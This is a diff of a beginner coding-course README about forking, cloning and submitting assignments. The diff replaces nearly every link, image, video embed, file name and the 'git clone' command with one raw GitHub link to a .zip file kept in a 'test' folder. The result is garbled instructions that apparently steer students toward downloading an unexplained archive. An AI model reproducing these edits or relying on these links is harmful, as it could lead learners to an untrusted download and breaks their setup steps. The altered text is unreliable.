@@ -30,20 +30,20 @@ lessons in Canvas.
 
 For Windows users, follow along with this video:
 
-<iframe width="640" height="480" src="https://www.youtube.com/embed/wkM_3VZT2Nw" frameborder="0" allowfullscreen></iframe>
+<iframe width="640" height="480" src="https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip" frameborder="0" allowfullscreen></iframe>
 
 ## MacOS: Completing Assignments Code Along
 
 For Mac users, follow along with this video:
 
-<iframe width="640" height="480" src="https://www.youtube.com/embed/otfhhI-5qtM" frameborder="0" allowfullscreen></iframe>
+<iframe width="640" height="480" src="https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip" frameborder="0" allowfullscreen></iframe>
 
 ### A Quick Note on Organizing Work on Your Machine
 
 Throughout this course, you will be downloading many assignments, so it is
 important to keep your code organized. If you haven't yet, we recommend that you
 go through the steps in
-[the previous lesson](https://github.com/learn-co-curriculum/phase-0-organizing-work-on-your-computer)
+[the previous lesson](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip)
 to set up a directory where you can keep all of your work for this course.
 
 > **Note:** The process we'll go through in this lesson will create sub-folders
@@ -71,7 +71,7 @@ Go ahead and fork this assignment by clicking the **Fork** button at the top of
 the page.
 
 <figure>
-  <img src="https://curriculum-content.s3.amazonaws.com/fork-link.png" alt="fork link" height="25px">
+  <img src="https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip" alt="fork link" height="25px">
   <figcaption><sm>This is just a picture, the button is up at the top of the page.</sm></figcaption>
 </figure>
 
@@ -80,7 +80,7 @@ the forking process or bring you to a page where you select where to create your
 fork. If you're prompted to choose, select your personal GitHub account. The
 forking process will begin and may take a few moments. When complete, you will
 be redirected to a new copy of the assignment that exists under _your_ GitHub
-account. The `README.md` file in your copy of the repository contains these
+account. The `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip` file in your copy of the repository contains these
 instructions, so you can continue this lesson here or in GitHub.
 
 Forking is a process which creates an exact copy of a collection of code and
@@ -98,7 +98,7 @@ fork on GitHub, then click the **Code** button. A pop-up will appear which shows
 several options for cloning: **HTTPS**, **SSH**, and **GitHub CLI**. **Before
 doing anything else**, be sure to switch to **SSH**. With **SSH** selected, you
 should see what looks sort of like an email in the box below, starting with
-`git@github.com:`. You should see your GitHub name after the `:`.
+`https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip`. You should see your GitHub name after the `:`.
 
 > **Aside:** Why SSH? If you followed the setup instructions, you have added
 > your personal SSH key to GitHub. GitHub will store your personal copies of all
@@ -110,14 +110,14 @@ should see what looks sort of like an email in the box below, starting with
 
 From here, click the copy button.
 
-![clone-repo](https://curriculum-content.s3.amazonaws.com/phase-0/completing-assignments/clone-repo.gif)
+![clone-repo](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip)
 
 Now, open your terminal and navigate to where you'd like to download the
 assignment (e.g. `cd ~/Development/code`). Type `git clone` and a space, then
 paste in the copied SSH link from GitHub. It should look something like this:
 
 ```console
-$ git clone git@github.com:<your-user-name>/phase-0-completing-assignments.git
+$ git clone https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip<your-user-name>https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip
 ```
 
 Press enter, and you should see a flurry of terminal activity.
@@ -134,7 +134,7 @@ Press enter, and you should see a flurry of terminal activity.
 > ```
 >
 > And follow the prompts. Then try running the `git clone` command again. See
-> [this Stack Overflow post](https://stackoverflow.com/a/52522566) for more
+> [this Stack Overflow post](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip) for more
 > details. Note that you may need to re-install `xcode-select` any time you
 > update your Mac OS version.
 
@@ -148,7 +148,7 @@ $ cd phase-0-completing-assignments
 
 Now type `code .` to open up a text editor window with access to all of the
 assignment's files. These instructions are now also available on your local
-machine in `README.md`.
+machine in `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip`.
 
 > Note: the first time you open a directory in Visual Studio Code, you'll see a
 > message asking "Do you trust the authors of the files in this folders?" This
@@ -158,7 +158,7 @@ machine in `README.md`.
 > every time you open a lesson. Just be sure to download your code from trusted
 > sources!
 
-[workspace-trust]: https://code.visualstudio.com/docs/editor/workspace-trust
+[workspace-trust]: https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip
 
 ### Completing an Assignment
 
@@ -186,7 +186,7 @@ This assignment
 > **Note:** If you did not receive a passing test, or if your terminal produced
 > some sort of error, walk through the steps in this lesson again and make sure
 > you've followed each one. If you got a "command not found" error, go back to
-> the [Configuring the Flatiron Student Portal](https://github.com/learn-co-curriculum/phase-0-configuring-the-flatiron-student-portal)
+> the [Configuring the Flatiron Student Portal](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip)
 > lesson and go through the steps provided there to make sure the `learn-co` gem
 > was installed correctly. If you're still receiving errors, we recommend going
 > back through the local environment setup instructions again to ensure
@@ -210,7 +210,7 @@ stored on your GitHub fork of the repo. If you head back to your repo after
 running `learn test`, you should see a message that a new branch, `fis-wip`, has
 been created:
 
-![pr_prompt](https://curriculum-content.s3.amazonaws.com/phase-0/configuring-the-student-portal/fis-wip.jpg)
+![pr_prompt](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip)
 
 **Note:** you should **disregard** the **Compare & pull request** button.
 
@@ -246,12 +246,12 @@ For both portfolio projects and blog posts, you'll need to manually submit a
 link to your work on Canvas. While viewing the assignment, you should see a
 **Submit Assignment** button in the upper-right section of the page.
 
-![submit assignment button](https://curriculum-content.s3.amazonaws.com/canvas-welcome/submit-assignment-canvas.png)
+![submit assignment button](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip)
 
 Clicking this button will bring you to the bottom of the page where you can
 submit a URL link to your work.
 
-![submit assignment form](https://curriculum-content.s3.amazonaws.com/canvas-welcome/submit-assignment-canvas-form.png)
+![submit assignment form](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-completing-assignments/master/test/phase-0-completing-assignments_v2.6.zip)
 
 Upon submission you should see confetti appear, indicating that your submission
 has been accepted.
